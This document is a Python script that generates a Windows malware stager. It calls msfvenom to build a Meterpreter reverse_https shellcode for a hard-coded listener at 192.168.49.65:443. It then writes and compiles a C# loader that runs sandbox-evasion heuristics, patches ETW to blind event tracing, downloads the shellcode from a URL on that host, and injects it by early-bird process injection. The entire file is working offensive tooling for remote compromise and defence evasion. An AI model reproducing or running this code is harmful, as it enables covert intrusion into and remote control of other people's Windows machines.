#!/bin/env python3
import ak
import os
import subprocess

LHOST = "192.168.49.65"
LPORT = 443
BASE_FILENAME = 'win_msf_sliver_stager_earlybird'
MSFVENOM_CMD = f"msfvenom -p windows/x64/meterpreter/reverse_https LHOST={LHOST} LPORT={LPORT} -f raw -e generic/none"
STAGER_URL = "http://192.168.49.65/sc"

def get_shellcode(msfvenom_cmd):
  shellcode = subprocess.check_output(msfvenom_cmd, shell=True)

  return shellcode

def generate(stager_url):
  url_dl_code = ak.URL_DL_CODE.format(STAGER_URL=STAGER_URL)

  template = """
using System;
using System.Net;
using System.Runtime.InteropServices;
using System.Diagnostics;

namespace SliverStager
{{
    public class Stager
    {{
        {ak.START_PROCESS_EARLYBIRD_IMPORT}
        {ak.HEURISTICS_IMPORT}
        {ak.ARCH_DETECTION}
        {ak.ETW_FUNCS}
        public static void Main()
        {{
            {ak.HEURISTICS_CODE}
            {ak.ETW_PATCH}
            {URL_DL_CODE}
            {ak.START_PROCESS_EARLYBIRD_CODE}
        }}

    }}
}}
  """.format(URL_DL_CODE=url_dl_code,
             ak=ak)

  print(template)
  f = open(BASE_FILENAME + ".cs", "w")
  f.write(template)
  f.close()

  print("Wrote " + BASE_FILENAME + ".cs")


def compile():
  cmd = f"mcs {BASE_FILENAME}.cs"
  os.system(cmd)

def generate_shellcode():
  shellcode = get_shellcode(MSFVENOM_CMD)

  filename = BASE_FILENAME + '.sc'
  f = open(filename, 'wb')
  f.write(shellcode)
  f.close()
  print("Wrote shellcode to " + filename)

def main():
  generate_shellcode()
  generate(STAGER_URL)
  compile()

if __name__ == "__main__":
  main()
